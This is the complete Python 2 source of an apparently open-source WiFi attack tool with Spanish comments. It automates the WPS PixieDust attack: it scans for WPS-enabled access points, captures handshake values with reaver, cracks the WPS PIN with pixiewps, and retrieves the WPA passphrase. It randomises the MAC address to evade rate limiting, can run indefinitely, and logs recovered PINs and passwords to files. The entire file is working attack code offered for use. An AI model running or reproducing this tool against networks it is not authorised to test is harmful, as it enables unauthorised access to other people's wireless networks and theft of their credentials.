from os import kill, system, path, chdir
from signal import alarm, signal, SIGALRM, SIGKILL
import time
import subprocess
from re import sub, compile, search
from sys import argv

REAVER = 'reaver'
PIXIEWPS = 'pixiewps'
WASH = 'wash'
AIRMON = 'airmon-ng'
MACCHANGER = 'macchanger'
GIT = 'git'
INFO = '\033[32m[+] \033[0m'   # Verde
ALERTA = '\033[31m[!] \033[0m' # Rojo
INPUT = '\033[34m[>] \033[0m'  # Azul
DATA = '\033[33m[DATA] \033[0m'  #Amarillo
OPCION = '\033[33m[!!!] \033[0m' #Amarillo
USE_REAVER = False   # Si False usa wash y termina.
USE_PIXIEWPS = False # Intenta averiguar el pin WPS con pixiewps
WASH_TIME = 11       # Tiempo para que wash recopile APs con WPS
WASH_CHANNEL = ''    # Todos
REAVER_TIME = 6      # Tiempo para que reaver recopile la informacion
CHOICES_YES = ['S', 's', '', 'si', 'Si']
CHOICES_NOPE = ['N', 'n', 'no', 'No']
PROMPT_APS = False
OUTPUT = False
OUTPUT_FILE = 'data.txt'
PRINT_REAVER = True
PRINT_PIXIE = True
GET_PASSWORD = False
FOREVER = False
OVERRIDE = False

def banner():
  """
  Imprime el banner en la pantalla
  """
  
  print
  print "\t ____             _                         "
  print "\t|  _ \ _   ___  _(_) _____      ___ __  ___ "
  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / \'_ \/ __|"
  print "\t|  __/| |_| |>  <| |  __/\ V  V /| |_) \__ \\"
  print "\t|_|    \__, /_/\_\_|\___| \_/\_/ | .__/|___\\"
  print "\t       |___/                     |_|        "
  print
  print "\tHecho por jgilhutton"
  print "\tReaver 1.5.2 mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg"
  print "\tCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
  print "\tPixiewps  Copyright (c) 2015, wiire <wi7ire@gmail.com>"
  print "\tMacchanger por Alvaro Ortega Copyright (C) 2003 Free Software Foundation, Inc."
  print
  
def arg_parser():
  """
  Detecta los argumentos y devuelve la ayuda si hay algun problema
  """
 
  global PRINT_PIXIE
  global PRINT_REAVER
  global USE_REAVER
  global USE_PIXIEWPS
  global WASH_TIME
  global REAVER_TIME
  global WASH_CHANNEL
  global PROMPT_APS
  global OUTPUT_FILE
  global OUTPUT
  global GET_PASSWORD
  global FOREVER
  global OVERRIDE
  H = ['-h','--help']
  binary_flags = ['-w','-t','-c','-o']
  
  for arg in argv[1:]:
    if arg in H:
      help()
      exit()
    elif argv[argv.index(arg)-1] in binary_flags:
      continue
    elif arg == '-q' or arg == '--quiet':
      PRINT_PIXIE = False
      PRINT_REAVER = False
    elif arg == '-r' or arg == '--use-reaver':
      USE_REAVER = True
    elif arg == '-p' or arg == '--use-pixie':
      USE_PIXIEWPS = True
    elif arg == '-w' or arg == '--wash-time':
      try:
	WASH_TIME = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-t' or arg == '--tiempo':
      try:
	REAVER_TIME = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-c' or arg == '--canal':
      try:
	WASH_CHANNEL = int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-P' or arg == '--prompt':
      PROMPT_APS = True
    elif arg == '-o' or arg == '--output':
      OUTPUT = True
      OUTPUT_FILE = argv[argv.index(arg)+1]
    elif arg == '-f' or arg == '--pass':
      GET_PASSWORD = True
    elif arg == '-F' or arg == '--forever':
      FOREVER = True
    elif arg == '-O' or arg == '--override':
      OVERRIDE = True
    else:
      help()

def help():
  """
  Muestra la ayuda y sale
  """
  
  print
  print "script -r -p -w 15 -t 6 -c 7 -P -o file.txt -f"
  print "script --use-reaver --use-pixie --wash-time 15 --tiempo 6 --canal 7 --prompt --output file.txt -h"
  print
  print '\t-r --use-reaver          Captura la informacion del AP con Reaver.              [False]'
  print '\t-p --use-pixie           Una vez que captura la informacion con Reaver          [False]'
  print '\t                         intenta sacar el pin WPS del router.'
  print '\t-w --wash-time [tiempo]  Setea el tiempo que va a usar para enumerar los        [15]'
  print '\t                         ap con WPS.'
  print '\t-t --tiempo [tiempo]     Setea el tiempo que va a usar para recolectar la       [6]'
  print '\t                         informacion del AP.'
  print '\t-c --canal [canal]       Proporciona el canal en el que escucha para enumerar'
  print '\t                         los AP con WPS. Si no se usa, se escanean todos los canales.'
  print '\t-P --prompt              Si se encuentra mas de un AP con WPS, preguntar a cual [False]'
  print '\t                         se quiere atacar.'
  print '\t-o --output [archivo]    Graba los datos en un archivo de texto.'
  print '\t-f --pass                Si se tiene exito al averiguar el pin WPS, tambien'
  print '\t                         tratar de averiguar la clave WPA.'
  print '\t-q --quiet               No muestra la informacion recopilada.'
  print '\t-F --forever             Corre el programa indefinidamente hasta que se lo interrumpa'
  print '\t-O --override            Vuelve a atacar APs con pines que ya han sido conseguidos'
  print '\t                         sin preguntar.'
  print
  exit()
  
class Engine():
  """
  Aca se chequea todo, y se empieza el programa
  """

  def __init__(self):
    self.REAVER = True
    self.PIXIEWPS = True
    self.WASH = True
    self.AIRMON = True
    self.MACCHANGER = True
    self.GIT = True
  
  def start(self):
    """
    Crea el colchon para los programas necesarios
    """
    chdir('/root/')
    if not c.check_iface(): # check_iface devuelve True si hay alguna ifaz en mon previamente
      c.set_iface("UP")
    else:
      print INFO + "Se encontro una interfaz en modo monitor: %s" %c.IFACE_MON
      choice = raw_input("%sDesea usar esta interfaz? [S/n] " %INPUT)
      if choice in CHOICES_YES:
	pass
      elif choice in CHOICES_NOPE:
	c.set_iface("DOWN")
	c.set_iface("UP")
    if FOREVER:
      while True:
	attack = Attack()
	attack.get_wps_aps()
    else:
      attack = Attack()
      attack.get_wps_aps()
      engine.exit_limpio()
    
  def parse_wash(self, linea):
    """
    Analiza el output del wash
    linea viene sin el salto de linea, separando las cosas con "|"
    Devuelve bssid, canal, essid e instancia de Target
    """
    
    linea = linea.split('|')
    bssid = linea[0] # MAC
    canal = linea[1]
    essid = linea[-1]
    return [bssid, canal, essid]
    
  def parse_reaver(self, output, pin_encontrado = False):
    """
    Analiza el output del reaver
    Saca el pkr, pke, hash1 y 2, enonce, rnonce, authkey, fabricante y modelo
    y los devuelve
    """

    if pin_encontrado:
      password = ''
      for linea in output:
	if '[+] WPA PSK: ' in linea:
	  password = sub('\[\+\] WPA PSK: ','',linea)
	  return password
      if password == '':
	return 'no password'

    E_NONCE = ''
    R_NONCE = ''
    PKR = ''
    PKE = ''
    HASH1 = ''
    HASH2 = ''
    AUTHKEY = ''
    MANUFACTURER = ''
    MODEL = ''
    NUMBER = ''
    uberlista = []
    lista_final = []
    is_complete = False
    has_something = False
    
    if output == '':
      return 'cacota'
      
    for linea in output:
      if 'E-Nonce' in linea:
	has_something = True
      elif 'E-Hash2' in linea:
	lista_final = output[0:output.index(linea)+1] # Trunca el output hasta el hash2
	is_complete = True
	break
      elif 'Detected AP rate limiting' in linea:
	return 'ap rate limited'
    if has_something and not is_complete:
      return 'more time please'
    elif has_something == False:
      return 'noutput'
    for linea in lista_final:
      if 'E-Nonce' in linea:
	E_NONCE = sub('\[P\] E-Nonce: ','',linea)
      elif 'R-Nonce' in linea:
	R_NONCE = sub('\[P\] R-Nonce: ','',linea)
      elif 'PKR' in linea:
	PKR = sub('\[P\] PKR: ','',linea)
      elif 'PKE' in linea:
	PKE = sub('\[P\] PKE: ','',linea)
      elif 'E-Hash1' in linea:
	HASH1 = sub('\[P\] E-Hash1: ','',linea)
      elif 'E-Hash2' in linea:
	HASH2 = sub('\[P\] E-Hash2: ','',linea)
      elif 'AuthKey' in linea:
	AUTHKEY = sub('\[P\] AuthKey: ','',linea)
      elif 'Manufacturer' in linea:
	MANUFACTURER = sub('\[P\] WPS Manufacturer: ','',linea)
      elif 'Model Name' in linea:
	MODEL = sub('\[P\] WPS Model Name: ','',linea)
      elif 'Model Number' in linea:
	NUMBER = sub('\[P\] WPS Model Number: ','',linea)
      elif '[+] Associated with ' in linea:
	ESSID = sub('\(ESSID\: ','|',linea)
	ESSID = ESSID.split('|')[-1][:-2]
      elif '[+] Waiting for beacon from ' in linea:
	BSSID = sub('\[\+\] Waiting for beacon from ','',linea)
      else:
	pass
    uberlista = [PKE.strip(),PKR.strip(),HASH1.strip(),HASH2.strip(),AUTHKEY.strip(),
    MANUFACTURER.strip(),MODEL.strip(),NUMBER.strip(),E_NONCE.strip(),R_NONCE.strip(),
    ESSID.strip(),BSSID.strip()]
    return uberlista
  
  def check(self, check_again = False):
    """
    Chequea dependencias, el usuario que ejecuta el programa y otras weas
    """
    
    if c.get_uid() != '0':
      print ALERTA + 'Necesita ejecutar este programa como superusuario'
      exit()

    ### Programas
    if c.program_exists(MACCHANGER):
      self.MACCHANGER = True
    elif not check_again:
      print ALERTA + 'macchanger no esta instalado pero no es vital para el programa.'
      print '    Algunos APs bloquean la MAC del dispositivo con el que se ataca y'
      print '    cambiar la MAC es una buena solucion para desviar el problema.'
      print '    Si no se tiene macchanger el programa fallara en recolectar la informacion.'
      self.MACCHANGER = False
    if c.program_exists(REAVER):
      version = c.check_reaver_version()
      if version == '1.5.2':
	self.REAVER = True
      else:
	print ALERTA + "La version de reaver instalada no es la correcta"
	self.REAVER = False
    elif not check_again:
      print ALERTA + 'reaver no esta instalado'
      self.REAVER = False
    if c.program_exists(PIXIEWPS):
      self.PIXIEWPS = True
    elif not check_again:
      print ALERTA + 'pixiewps no esta instalado'
      self.PIXIEWPS = False
    if c.program_exists(WASH):
      self.WASH = True
    elif not check_again:
      print ALERTA + 'wash no esta instalado'
      self.WASH = False
    if c.program_exists(AIRMON):
      self.AIRMON = True
    elif not check_again:
      print ALERTA + 'airmon-ng no esta instalado'
      self.AIRMON = False
    if c.program_exists(GIT):
      self.GIT = True
    elif not check_again:
      self.GIT = False
    if self.REAVER and self.AIRMON and self.WASH and self.PIXIEWPS and check_again:
      print INFO + "Todos los programas se instalaron correctamente."
      raw_input("%sPresione enter para continuar" %INPUT)
      print INFO + "Empezando el ataque..."
    elif check_again:
      print
      print ALERTA + "No se pudieron instalar algunos prorgamas."
      print "    Revise manualmente las dependecias necesitadas"
      print "    y luego de instalarlas, ejecute otra vez el programa."
      print
      exit()
    if self.REAVER and self.AIRMON and self.WASH and self.PIXIEWPS:
      pass
    else:
      print ALERTA + "Necesita tener todos los programas necesarios."
      print INPUT + "Las dependencias son:"
      print "\tbuild-essential"
      print "\tlibpcap-dev"
      print "\tsqlite3"
      print "\tlibsqlite3-dev"
      print "\taircrack-ng"
      print "\tlibssl-dev"
      choice = raw_input("%sDesea que instalarlas ahora [S/n]?" %INPUT)
      if choice in CHOICES_YES:
	c.get_binarios()
      else:
	exit()
    
    ###Todo en orden...
    engine.start()

  def run(self, cmd, shell = False, kill_tree = True, timeout = -1):
    """
    Ejecuta un comando durante un tiempo determinado que,
    transcurrido, es terminado. Devuelve el stdout del proc.
    output es una lista con las lineas sin strip().
    """

    class Alarm(Exception):
      pass
    def alarm_handler(signum, frame):
      raise Alarm
    if timeout != -1:
      signal(SIGALRM, alarm_handler) # Empieza a correr el tiempo
      alarm(timeout)                 # Si se acaba levanta una alarma

    proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
    output = []
    try:
      for line in iter(proc.stdout.readline, ''):
	output.append(line)
      if timeout != -1:
	alarm(0)
    except Alarm:         # El tiempo acaba y se produce una alarma
      pids = [proc.pid]   # Se matan los procesos relacionados con proc.
      if kill_tree:
	pids.extend(self.get_process_children(proc.pid))
      for pid in pids:   # Es posible que el proceso haya muerto antes de esto
	try:             # por eso se maneja el error con el except OSError
	  kill(pid, SIGKILL)
	except OSError:
	  pass
      return output
    return output

  def get_process_children(self, pid):
    """
    Devuelve los pids del programa que se haya abierto para
    matar todo el arbol de procesos child
    """
    
    proc = subprocess.Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True, stdout = subprocess.PIPE)
    stdout = proc.communicate()[0]
    return [int(p) for p in stdout.split()]

  def mac_changer(self):
    """
    Cambia la MAC del dispositivo ante un bloqueo del AP
    """
    
    print INFO + "Cambiando direccion MAC del dispositivo..."
    system('ifconfig %s down' %c.IFACE_MON)
    system('iwconfig %s mode Managed' %c.IFACE_MON)
    system('ifconfig %s up' %c.IFACE_MON)
    system('ifconfig %s down' %c.IFACE_MON)
    mac = subprocess.check_output(['macchanger','-r',c.IFACE_MON])
    mac = mac.split('\n')[2]
    mac = sub('New       MAC\: ','',mac.strip())
    mac = sub(' \(unknown\)','',mac)
    system('ifconfig %s up' %c.IFACE_MON)
    system('ifconfig %s down' %c.IFACE_MON)
    system('iwconfig %s mode monitor' %c.IFACE_MON)
    system('ifconfig %s up' %c.IFACE_MON)
    print INFO + "Se cambio la MAC a una nueva: %s%s" %(INPUT,mac.upper())
    
  def exit_limpio(self):
    """
    limpia las cosas antes de terminar el programa
    """
    if path.isfile('/root/pixiewps/Makefile') or path.isfile('/root/reaver-wps-fork-t6x/src/Makefile'):
      print OPCION + "Los archivos para instalar pixiewps y reaver ya no son necesarios"
      print "      y se encuentran en la carpeta home del usuario root"
      choice = raw_input("%sDesea borrarlos? [S/n]" %INPUT)
      if choice in CHOICES_YES:
	system('cd /root && rm -r pixiewps/ && rm -r reaver-wps-fork-t6x/')
    if c.IS_MON:
      c.set_iface("DOWN")
    if USE_REAVER:
      system('rm -f /usr/local/etc/reaver/*.wpc')
    exit()

class Config():
  """
  Funciones de configuracion de interfaces.
  """
  
  IFACE_MON = 'caca'
  IFACE = 'caca'
  IS_MON = False
  
  def program_exists(self, programa):
    """
    Chequea si existe el programa que se le
    pasa en el argumento
    """

    cmd = "which " + programa
    output = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE)
    output = output.communicate()[0]

    if output != "":
      return True    # Existe
    else:
      return False   # No existe

  def get_uid(self):
    """
    Devuelve el usuario que ejecuta el script
    """
    
    uid = subprocess.check_output(['id','-u']).strip()
    return uid
  
  def check_iface(self):
    """
    Se fija si hay alguna interfaz en modo monitor
    para no crear otra interfaz al pedo
    """
    
    cmd = "ifconfig | grep mon | cut -d \' \' -f1" # iwconfig no es grepable
    mon = subprocess.check_output(cmd, shell = True).strip()
    if mon != '':
      self.IFACE_MON = mon
      self.IS_MON = True
      return True
    else:
      return False
  
  def get_iface(self):
    """
    Si no hay interfaces en modo monitor, devuelve las wlans.
    Si hay mas de una, pregunta cual se quiere usar.
    Si la interfaz ya esta en modo monitor, devuelve el nombre.
    """

    if self.IS_MON: # Si la interfaz esta en modo monitor devuelve el nombre 'mon'
      cmd = "ifconfig | grep mon | cut -d \' \' -f1"
      mon = subprocess.check_output(cmd, shell = True).strip()
      self.IFACE_MON = mon
      return mon
    else:
      cmd = "ifconfig | grep wlan | cut -d \' \' -f1"
      proc = subprocess.check_output(cmd, shell = True)
      ifaces = proc.strip().split('\n')

      if len(ifaces) == 1 and ifaces[0] == '':
	print ALERTA + "No hay interfaces wireless!"
	print "    Asegurese de que posee un dispositivo wireless."
	print "    Si esta corriendo en una maquina virtual debe"
	print "    adquirir un modulo WiFi USB."
	exit()
      elif len(ifaces) > 1:
	print INPUT + "Seleccione interfaz: "
	for i in ifaces:
	  print str(ifaces.index(i)) + " >> " + i
	while True:    #Evita que le mandes fruta
	  try:
	    choice = int(raw_input(INPUT))
	    if choice <= len(ifaces) and choice >= 0:
	      self.IFACE = ifaces[choice]
	      return ifaces[choice]
	      break
	    else:
	      print INPUT + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Maneja el error de indice
	  except ValueError:
	    print ALERTA + "Inserte un numero entre 0 y %s" %(len(ifaces)-1) #Por si le mandas letras y no #s
	  except KeyboardInterrupt:
	    print 
	    print ALERTA + "Programa interrumpido"
	    print 
	    engine.exit_limpio()
      else:
	self.IFACE = ifaces[0]
	return ifaces[0]
  
  def set_iface(self, status):
    """
    Maneja la interfaz inalambrica. La pone en modo monitor
    y la repone al modo normal.
    La variable "status" esta solo para mejorar la lectura
    Se basa en el booleano "self.IS_MON"
    """   
    
    if self.IS_MON:
      cmd = 'airmon-ng stop ' + self.get_iface()
      print INFO + 'Terminando el modo monitor en la interfaz %s...' %self.IFACE_MON
      proc = subprocess.call(cmd, shell = True, stdout = subprocess.PIPE)
      self.IS_MON = False
      print INFO + 'Listo'
    else:
      cmd = 'airmon-ng start ' + self.get_iface()
      print INFO + 'Configurando la interfaz en modo monitor...'
      proc = subprocess.call(cmd, shell = True, stdout = subprocess.PIPE)
      self.check_iface()
      print INFO + "%s corriendo en modo monitor" %self.IFACE
      
  def data_file(self, data):
    """
    Guarda la informacion en un archivo
    """
    system('echo INFORMACION >> %s' %OUTPUT_FILE)
    with open(OUTPUT_FILE, 'a+') as f:
      fecha = str(time.gmtime()[1])+'-'+str(time.gmtime()[2])+'-'+str(time.gmtime()[0])
      hora = str((time.gmtime()[3])-3).zfill(2)+':'+str(time.gmtime()[4]).zfill(2)
      f.write(fecha+' | '+hora+'\n')
      f.writelines(data)
    print INFO + "Se guardo la informacion en el archivo %s" %OUTPUT_FILE
    
  def get_binarios(self):
    """
    Instala reaver, pixiewps y otras dependencias
    """
    
    git = 'apt-get -y install git'
    reaver_dep = 'apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng'
    pixie_dep = 'sudo apt-get -y install libssl-dev'
    reaver = 'git clone https://github.com/t6x/reaver-wps-fork-t6x.git'
    pixiewps = 'git clone https://github.com/wiire/pixiewps.git'
    aircrack = 'apt-get -y install aircrack-ng'
    if not engine.GIT:
      print INFO + "Instalando git"
      proc4 = system(git)
    if not engine.AIRMON:
      print INFO + "Instalando aircrack..."
      proc5 = system(aircrack)
    if not engine.PIXIEWPS:
      print INFO + "Instalando dependencias de pixiewps..."
      proc2 = system(pixie_dep)
      print INFO + "Descargando pixiewps..."
      proc3 = system(pixiewps)    
    if not engine.REAVER:
      print INFO + "Instalando las dependencias de reaver..."
      proc = system(reaver_dep)
      print INFO + "Descargando reaver..."
      proc1 = system(reaver)
    if path.isdir('pixiewps') and not engine.PIXIEWPS:
      print INFO + "Instalando pixiewps..."
      system('cd pixiewps/src && make && make install')
      print INFO + "Listo"
    if path.isdir('reaver-wps-fork-t6x') and not engine.REAVER:
      print INFO + "Instalando reaver..."
      system('cd reaver-wps-fork-t6x* && cd src && ./configure && make && make install')
      print INFO + "Listo"
    engine.check(check_again = True)

  def check_reaver_version(self):
    """
    Devuelve la version de reaver que se tiene instalada
    """
    
    output = subprocess.Popen('reaver -h', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    output = output.communicate()
    if 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[0] and 'mod by t6_x' in output[0]:
      return '1.5.2'
    elif output[0] != '':
      return output[0][9:12]
    elif 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[1] and 'mod by t6_x' in output[1]:
      return '1.5.2'
    elif output[1] != '':
      return output[1][9:12]

class Attack():
  """
  Funciones de ataque y recopilacion de informacion del AP
  """
  
  def get_wps_aps(self):
    """
    Enumera los APs con WPS
    Crea las instancias de Target.
    Pasa a get_reaver_info
    """

    print INFO + "Enumerando APs con WPS activado..."
    cmd = 'wash -i %s -P' %(c.IFACE_MON)
    if WASH_CHANNEL != '':
      cmd = cmd + ' -c %d' %WASH_CHANNEL
    lista_aps = engine.run(cmd, shell = True, timeout = WASH_TIME)
    lista_provisoria = []
    ultimo = len(lista_aps)-1
    for linea in lista_aps:             # Esto se tiene que hacer por irregularidades ocasionales
      if '|' in linea:                  # en el output del wash.
	lista_provisoria.append(linea)  #
    lista_aps = lista_provisoria        #
    if lista_aps == []:
      print
      print ALERTA + "No se encontraron APs con WPS activado."
      print
      if not FOREVER:
	engine.exit_limpio()
    else:
      for_fill = lista_aps                                              #\
      essids = []                                                       #|
      for line in for_fill:                                             #|- Para que quede mas linda la lista
	line = line.split('|')                                          #|- de los APs.
	essids.append(line[5].strip())                                  #|
      fill = len(max(essids))                                           #/
      print INFO + "Se encontraron los siguientes APs con WPS activado:"
      for linea in lista_aps:
	linea = linea.split('|')
	fill_line = fill - len(linea[5].strip())
	print '\t' + INPUT + str(linea[5].strip()) + ' '*fill_line + ' || ' + linea[0] + ' || Canal: ' + linea[1] + ' || WPS locked?: ' + linea[4]
      if USE_REAVER:
	while True:
	  try:
	    if len(lista_aps) != 1 and PROMPT_APS: 
	      choice = int(raw_input("%sProporcione el inice del AP: " %INPUT))
	      provisoria = []
	      provisoria.append(lista_aps[choice])
	      lista_aps = provisoria
	      break
	    else:
	      break
	  except KeyboardInterrupt:
	    print
	    engine.exit_limpio()
	    break
	  except ValueError:
	    print ALERTA + "Proporcione un numero entre 0 y %d" %ultimo
	if not OVERRIDE and path.isfile('pyxiewpsdata.txt'):
	  coincidencias = []
	  pin_correspondiente = []
	  with open('pyxiewpsdata.txt') as f:
	    ya_sacados = f.readlines()
	  if len(ya_sacados) > 1:
	    ya_sacados.reverse() # Se revierte para tomar el pin mas actualizado ante un posible
	    for target in lista_aps: # cambio del pin WPS.
	      for line in ya_sacados[1:]:
		if target.split('|')[5].strip() == line.strip():
		  coincidencias.append(target)
		  pin_correspondiente.append(ya_sacados[ya_sacados.index(line)-1].strip())
	    for i in set(coincidencias):
	      print OPCION + "El pin de %s ya ha sido averiguado: " %i.split('|')[5].strip()
	      print '\t'+ INPUT + pin_correspondiente[coincidencias.index(i)]
	      print OPCION + "Desea saltearlo? [S/n]: "
	      try:
		choice = raw_input("%s Enter para saltear: " %INPUT)
	      except KeyboardInterrupt:
		print
		engine.exit_limpio()
	      if choice in CHOICES_YES:
		lista_aps.remove(i)
	for linea in lista_aps:
	  args = engine.parse_wash(linea.strip())
	  self.get_reaver_info(args[0],args[1],args[2])
	if not FOREVER:
	  engine.exit_limpio()
	else:
	  pass
  
  def get_reaver_info(self, bssid, canal, essid):
    """
    Recopila la informacion vital para
    el ataque PixieDust. PKR, PKE, HASH1, HASH2, AUTHKEY
    Actua dentro del for-loop de get_wps_aps
    """

    print INFO + "Recopilando informacion de %s con reaver..." %essid
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-L','-c',canal], timeout = REAVER_TIME)
    data = engine.parse_reaver(output)
    if data == 'noutput':
      print
      print ALERTA + "No se pudo obtener la informacion necesaria del AP"
      print ALERTA + "Pruebe con un tiempo mas alto como argumento -t"
      print "    y si aun no se puede obtener la informacion"
      print "    mejore la recepcion de su interfaz"
      print
      if MACCHANGER and FOREVER:
	engine.mac_changer()
      elif MACCHANGER and not FOREVER:
	print ALERTA + "No se cambia la MAC porque se ejecuto una sola vez"
	print "    Corra el programa con el argumento -F para correr indefinidamente"
	print
      elif not MACCHANGER:
	print ALERTA + "No se puede cambiar la MAC del dispositivo"
	print "    porque no se tiene macchanger instalado."
	print
    elif data == 'more time please':
      print
      print ALERTA + "El programa obtuvo alguna informacion pero no alcanzo"
      print "    a recuperar todo lo necesario. Aumente el tiempo para buscar"
      print "    la informacion del AP con el argumento -t. Por default -t es 6 segundos"
      print
    elif data == 'ap rate limited':
      print
      print ALERTA + "Al AP no le gustan los ataques de WPS"
      print "    por lo tanto no se pudo recopilar la informacion"
      print
      if MACCHANGER and FOREVER:
	engine.mac_changer()
      elif MACCHANGER and not FOREVER:
	print ALERTA + "No se cambia la MAC porque se ejecuto una sola vez"
	print "    Corra el programa con el argumento -F para atacar indefinidamente"
	print
      elif not MACCHANGER:
	print ALERTA + "No se puede cambiar la MAC del dispositivo"
	print "    porque no se tiene macchanger instalado."
	print
    elif data == 'cacota':
      print
      print "Seleccione una opcion de sesion para reaver"
      if not FOREVER:
	engine.exit_limpio()
    else:
      print INFO + "Exito. Se encontro la informacion necesaria."
      for_file = ['ESSID: ' + data[10] + '\n','MAC: ' + data[11] + '\n','PKE: ' + data[0] + '\n',
      'PKR: ' + data[1] + '\n','HASH1: ' + data[2] + '\n','HASH2: ' + data[3] + '\n',
      'E-NONCE: ' + data[8] + '\n','R-NONCE: ' + data[9] + '\n','AUTHKEY: ' + data[4] + '\n',
      'FABRICANTE: ' + data[5] + '\n','MODELO: ' + data[6] + '\n','NUMERO DE MODELO: ' + data[7] + '\n']
      if PRINT_REAVER:
	print
	for linea in for_file:
	  print DATA + linea.strip()
	print
      if OUTPUT and not USE_PIXIEWPS:
	for_file.append('-'*40+'\n')
	c.data_file(for_file)
      if USE_PIXIEWPS:
	self.pixie_attack(data,for_file,canal)

  def pixie_attack(self,data,for_file,canal):
    """
    intenta recuperar el pin WPS usando el ataque PixieDust
    """
    
    ESSID = data[10]
    BSSID = data[11]
    PKE = data[0]
    PKR = data[1]
    HASH1 = data[2]
    HASH2 = data[3]
    AUTHKEY = data[4]
    E_NONCE = data[8]
    R_NONCE = data[9]
    
    cmd = ['pixiewps','-e',PKE,'-r',PKR,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE]
    cmd1 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE,'-S']
    cmd2 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-n',E_NONCE,'-m',R_NONCE,'-b',BSSID,'-S']
    pin = ''
    cmd_list = [cmd, cmd1, cmd2]
    output = []
    for command in cmd_list:
      try:
	output = subprocess.check_output(command)
	output = output.strip().split('\n')
	for linea in output:
	  if '[+] WPS pin:' in linea:
	    result = compile('\d+')
	    pin = result.search(linea).group(0)
	    break
	  else:
	    pass
      except:             #Tengo que manejar un posible error del Pixie
	pass
      if pin != '': break
    if pin != '' and len(pin) == 8:
      print INFO + "Pin WPS encontrado!"
      print "\t" + INPUT + pin
      for_file.append('Pin WPS: '+pin+'\n')
      system('echo >> pyxiewpsdata.txt')
      with open('pyxiewpsdata.txt','a+') as f:
	f.write(ESSID+'\n')
	f.write(pin)
    elif pin == '':
      print
      print ALERTA + "No se encontro el pin WPS."
      print "    Es posible que el AP no sea vulnerable al"
      print "    ataque PixieDust y nunca lo sea"
      print
      
    if GET_PASSWORD and pin != '':
      self.get_password(for_file, BSSID, pin, canal)
    elif OUTPUT:
      for_file.append('-'*40+'\n')
      c.data_file(for_file)
  
  def get_password(self, for_file, BSSID, pin, canal):
    """
    Intenta averiguar la contrasenia, una vez que se consiguio el pin WPS
    """
    
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',canal,'-p',pin,'-L'], timeout = (REAVER_TIME+4))
    password = engine.parse_reaver(output, pin_encontrado = True)
    if password == 'no password':
      print
      print ALERTA + "No se pudo recuperar la contrasenia en este momento"
      print "    pero puede acceder a la red WiFi a traves del pin WPS"
      print
    else:
      print INFO + "Clave encontrada!"
      print '\t' + INPUT + password.strip()
    if OUTPUT:
      for_file.append('Password: ' + password + '\n'+'-'*40+'\n')
      c.data_file(for_file)

if __name__ == '__main__':
  arg_parser()
  banner()
  try:
    c = Config()
    engine = Engine()
    engine.check()
  except KeyboardInterrupt, EOFError:
    print
    print ALERTA + "Programa interrumpido!"
    print    
    engine.exit_limpio()
